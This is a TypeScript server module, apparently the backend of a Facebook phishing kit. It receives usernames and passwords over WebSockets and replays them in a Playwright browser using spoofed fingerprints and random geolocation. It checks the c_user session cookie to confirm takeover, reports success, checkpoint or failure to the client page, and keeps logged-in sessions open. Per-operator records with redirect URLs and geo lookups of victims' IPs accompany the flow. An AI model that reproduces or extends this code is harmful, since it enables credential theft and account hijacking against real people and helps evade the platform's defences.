import WebSocket, { WebSocketServer } from 'ws';
import * as http from 'http';
import geoip from 'geoip-lite';
import Logger from './logger.js';
import requestIp from 'request-ip';
import * as UserDB from '../database/user/user.database.js'
import { ClientInfo } from '../utils/user.info.interface.js';

import { chromium } from 'playwright-extra';
import { newInjectedContext } from 'fingerprint-injector';
import { BrowserContext, Page/*, Route, Request*/ } from 'playwright';
import { LoginFields } from '../utils/login.fields.interface.js';
import { findCookieValue, getRandomTimeout } from '../shared/shared.js';
// import { Browser, BrowserContext, Cookie, Page, Request, Route } from 'playwright';

class WebSocketPool {
    private static wssInstance: WebSocket.Server | null = null;
    private static clientsMap: Map<string, WebSocket> = new Map();
    private static logger = new Logger();

    private static MAX_CONNECTIONS: number = 500;
    private static activeConnections: number = 0;
    private static clientInfo: ClientInfo;

    private static FORMS = [
        {
            "emailInput": "#m_login_email",
            "passInput": "#m_login_password",
            "buttonLogin": "div[role='button'][data-anchor-id='replay']",
            "formAction": "com.bloks.www.bloks.caa.login.async.send_login_request",
            "type": "mobile"
        },
        {
            "emailInput": "form[id='login_form'] #m_login_email",
            "passInput": "form[id='login_form'] #m_login_password",
            "buttonLogin": "form[id='login_form'] button[name='login']",
            "formAction": "/login/device-based/",
            "type": "mobile"
        },
        {
            "emailInput": "form[id='login_form'] #email",
            "passInput": "form[id='login_form'] #pass",
            "buttonLogin": "form[id='login_form'] button[type='submit']",
            "formAction": "/login/device-based/",
            "type": "desktop"
        },
        {
            "emailInput": "form[action*='/login/?privacy_mutation_token'] #email",
            "passInput": "form[action*='/login/?privacy_mutation_token'] #pass",
            "buttonLogin": "form[action*='/login/?privacy_mutation_token'] button[type='submit']",
            "formAction": "/login/?privacy_mutation_token",
            "type": "desktop"
        }
    ]

    static createWebSocketServer(server: http.Server): WebSocket.Server | void {
        if (this.wssInstance) {
            return this.wssInstance;
        }

        // Creando servidor WebSockets
        this.wssInstance = new WebSocketServer({ server: server, path: "/ws" });

        this.wssInstance.on('connection', async (client: WebSocket, req: http.IncomingMessage) => {
            // Incrementa el contador de conexiones
            if (this.activeConnections >= this.MAX_CONNECTIONS) {
                // Rechaza la conexión si se alcanza el límite
                client.send('Lo siento, el servidor está ocupado en este momento. Inténtalo más tarde.');
                this.logger.alert('Lo siento, el servidor está ocupado en este momento. Inténtalo más tarde.');
                client.close();
                return;
            }

            // Generando Identificador
            const userId = this.uuidv4();

            // Almacena la conexión WebSocket
            this.clientsMap.set(userId, client);

            const identifier = req.url?.split('=')[1];
            if (!identifier) {
                this.handleEvent(userId, {
                    event: 'nothing',
                    data: { case: 'identifier not found' }
                });

                this.clientsMap.delete(userId);
                this.logger.error(`Usuario ${userId} => Identifier not found`);
                return;
            }

            const user = await UserDB.getUserById(identifier);
            if (!user) {
                this.handleEvent(userId, {
                    event: 'nothing',
                    data: { case: 'user not found' }
                });

                this.clientsMap.delete(userId);
                this.logger.error(`Usuario ${userId} => User not found`);
                return;
            }

            // Obtener la dirección IP del usuario
            const userIp = requestIp.getClientIp(req);
            if (!userIp) {
                this.handleEvent(userId, {
                    event: 'redirect',
                    data: { url: user.config.redirect }
                });

                this.clientsMap.delete(userId);
                this.logger.error(`Usuario ${userId} => Ip not found`);
                return;
            }

            // Obtener información geográfica
            const geoInfo = geoip.lookup(userIp);
            if (!geoInfo || !geoInfo.country) {
                this.handleEvent(userId, {
                    event: 'redirect',
                    data: { url: user.config.redirect }
                });

                this.clientsMap.delete(userId);
                this.logger.error(`Usuario ${userId} => Ip not found`);
                return;
            }

            this.clientInfo = {
                userIp,
                identifier,
                config: user.config,
                percent: user.percent,
                countryCode: geoInfo.country
            };

            // this.logger.info(`Usuario ${userId} cocnetado!`);
            this.logger.info(`Usuario ${userId} conectado => IP ${userIp}`);

            // Manejar eventos del cliente
            this.handleClient(userId, this.clientInfo, client);
        });
    }

    static uuidv4() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    static handleClient(userId: string, clientInfo: ClientInfo, client: WebSocket) {
        // Incrementa el contador de conexiones
        this.activeConnections++;

        client.on('message', async (message: string) => {
            try {
                const { event, data } = JSON.parse(message);

                switch (event) {
                    case 'userForm':
                        await this.runPlaywight(userId, data, clientInfo);
                        break;
                    case 'customEvent':
                        console.log('Evento personalizado:', data);
                        break;
                }
            } catch (error: any) {
                this.logger.error(`Inesperado en catch on 'message' => ${error.message}`)
            }
        });

        client.on('close', () => {
            // Disminuye el contador cuando una conexión se cierra
            this.activeConnections--;

            this.logger.error(`Usuario ${userId} desconectado => IP ${clientInfo.userIp}`);
            this.clientsMap.delete(userId);
        });
    }

    static handleEvent(userId: string, eventData: any) {
        const userConnection = this.clientsMap.get(userId);
        if (userConnection) {
            try {
                const serializedData = JSON.stringify(eventData);
                userConnection.send(serializedData);
            } catch (error) {
                console.error('Error al enviar el mensaje:', error);
            }
        }
    }

    static closeConnection(userId: string) {
        const userConnection = this.clientsMap.get(userId);
        if (userConnection) {
            userConnection.send('Conexión cerrada');
            userConnection.close();
            this.clientsMap.delete(userId);
            this.logger.alert(`Conexión cerrada para el usuario ${userId}`);
        } else {
            this.logger.error(`No se encontró una conexión para el usuario ${userId}`);
        }
    }

    static async runPlaywight(userId: string, data: any, clientInfo: ClientInfo) {
        // console.log('Usuario inició sesión:', data);

        const system = ['ios', 'android'];
        const randomSystem = system[Math.floor(Math.random() * system.length)];

        const browser = await chromium.launch({ headless: false });
        const context = await newInjectedContext(
            browser,
            {
                fingerprintOptions: {
                    devices: ['mobile'],
                    operatingSystems: [randomSystem as "android" | "ios"],
                },
                newContextOptions: {
                    geolocation: {
                        latitude: Math.random() * (90 - -90) + -90,
                        longitude: Math.random() * (90 - -180) + -180,
                    }
                }
            },
        );

        const page = await context.newPage();

        this.logger.neutral(`Usuario ${userId} => Abriendo facebook`);
        await page.goto('https://m.facebook.com/', { waitUntil: 'networkidle', timeout: 0 });

        const response: any = await this.authenticateWithDOM(userId, page, data, context);

        if (response.type === 'login_success') {
            // console.log(response.cookies);
            this.logger.success(response.message);

            // Almacenar las cookies

            // Enviar evento
            this.handleEvent(userId, {
                event: response.type,
                data: { message: 's' }
            });

            // Cerrar el navegador
            // await page.close();
            // await context.close();
            // await browser.close();
        } else if (response.type === 'login_block') {

            this.handleEvent(userId, {
                event: response.type,
                data: { message: '' }
            });

            this.logger.error(response.message);

        } else {
            this.handleEvent(userId, {
                event: response.type || 'error',
                data: { message: '' }
            });

            await page.close();
            await context.close();
            await browser.close();

            this.logger.error(response.message);
        }
    }

    static async authenticateWithDOM(userId: string, page: Page, data: any, context: BrowserContext) {
        this.logger.neutral(`Usuario ${userId} => Logueando facebook...`);

        return new Promise(async (resolve, reject) => {
            const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
            if (!loginFields) {
                return resolve({
                    type: 'error',
                    message: `Usuario ${userId} => Inicio de session sin respuesta`
                });
            }

            page.on('response', async (response) => {
                const url = response.url();
                
                const status = response.status();
                if (status >= 300 && status < 400) {
                    // console.log(`Redirección detectada: ${status} - ${response.headers().location}`);
                    // await page.goto(response.headers().location);
                    await page.goto('https://m.facebook.com/', { waitUntil: 'domcontentloaded'})
                }

                if (url.includes(loginFields.formAction)) {
                    console.log("ENTRO AQUIII");
                    // await page.goto('https://m.facebook.com/', { waitUntil: 'domcontentloaded'});
                    const cookies = await page.context().cookies();
                    const regex = new RegExp('^\\d+$');
                    const cUserValue = findCookieValue(cookies, 'c_user');
            
                    if (cUserValue && cUserValue.match(regex)) {
                        resolve({
                            type: 'login_success',
                            message: `Usuario ${userId} => Inicio de sesión exitoso`,
                            cookies
                        });
                    } else {
                        // Autenticación fallida o bloqueada
                        const loginFields = await this.findVisibleLoginFields(page, this.FORMS);
                        if (loginFields) {
                            resolve({
                                type: 'login_failed',
                                message: `Usuario ${userId} => Inicio de sesión fallido`
                            });
                        } else {
                            resolve({
                                type: 'login_checkpoint',
                                message: `Usuario ${userId} => Inicio de sesión bloqueado`
                            });
                        }
                    }
                }
            });

            await page.fill(loginFields.emailInput, data.username);
            await page.waitForTimeout(getRandomTimeout());
            await page.fill(loginFields.passInput, data.name);
            await page.waitForTimeout(getRandomTimeout());
            await page.click(loginFields.buttonLogin);
        }).catch((error) => {
            throw new Error(error);
        });
    }

    static async findVisibleLoginFields(page: Page, forms: LoginFields[]): Promise<LoginFields | null> {
        for (const form of forms) {
            const [emailInput, passInput, buttonLogin] = await Promise.all([
                page.$(form.emailInput),
                page.$(form.passInput),
                page.$(form.buttonLogin),
            ]);

            if (emailInput && passInput && buttonLogin) {
                const isVisible = await Promise.all([
                    emailInput.isVisible(),
                    passInput.isVisible(),
                    buttonLogin.isVisible(),
                ]);

                if (isVisible.every((visible) => visible)) {
                    return form;
                }
            }
        }

        return null;
    }
}

export default WebSocketPool;